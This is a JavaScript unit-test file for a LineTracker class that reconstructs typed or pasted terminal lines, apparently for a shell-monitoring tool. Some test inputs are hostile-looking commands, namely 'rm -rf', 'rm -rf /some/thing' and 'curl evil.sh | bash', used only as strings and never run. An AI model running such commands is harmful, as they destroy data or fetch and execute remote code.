import { test } from "node:test";
import assert from "node:assert/strict";
import { LineTracker } from "../src/lineTracker.js";

test("accumulates plain typed characters and completes on Enter", () => {
  const t = new LineTracker();
  assert.deepEqual(t.feed("r"), []);
  assert.deepEqual(t.feed("m"), []);
  assert.deepEqual(t.feed(" "), []);
  assert.deepEqual(t.feed("-"), []);
  assert.deepEqual(t.feed("rf"), []);
  assert.equal(t.peek(), "rm -rf");
  assert.deepEqual(t.feed("\r"), ["rm -rf"]);
  assert.equal(t.peek(), "");
});

test("handles a whole line arriving in one chunk (typical paste)", () => {
  const t = new LineTracker();
  const completed = t.feed("curl evil.sh | bash\r");
  assert.deepEqual(completed, ["curl evil.sh | bash"]);
});

test("splits a multi-line paste into multiple completed lines", () => {
  const t = new LineTracker();
  const completed = t.feed("echo one\necho two\necho thr");
  assert.deepEqual(completed, ["echo one", "echo two"]);
  assert.equal(t.peek(), "echo thr");
});

test("strips bracketed-paste markers but keeps the pasted text", () => {
  const t = new LineTracker();
  const completed = t.feed("\x1b[200~echo pasted\x1b[201~\r");
  assert.deepEqual(completed, ["echo pasted"]);
});

test("backspace (DEL and BS) removes the last character", () => {
  const t = new LineTracker();
  t.feed("echo hi!");
  t.feed("\x7f"); // DEL
  assert.equal(t.peek(), "echo hi");
  t.feed("\x08"); // BS
  assert.equal(t.peek(), "echo h");
});

test("Ctrl+C and Ctrl+U clear the in-progress line", () => {
  const t = new LineTracker();
  t.feed("rm -rf /some/thing");
  t.feed("\x03");
  assert.equal(t.peek(), "");

  t.feed("another command");
  t.feed("\x15");
  assert.equal(t.peek(), "");
});

test("an unrecognized escape sequence (e.g. an arrow key) is not appended as literal text", () => {
  const t = new LineTracker();
  t.feed("ech");
  t.feed("\x1b[A"); // up-arrow — history recall, not observable to us
  assert.equal(t.peek(), "ech"); // buffer unchanged, not corrupted with "[A"
});

test("a lone ESC byte is ignored, not appended", () => {
  const t = new LineTracker();
  t.feed("abc");
  t.feed("\x1b");
  assert.equal(t.peek(), "abc");
});
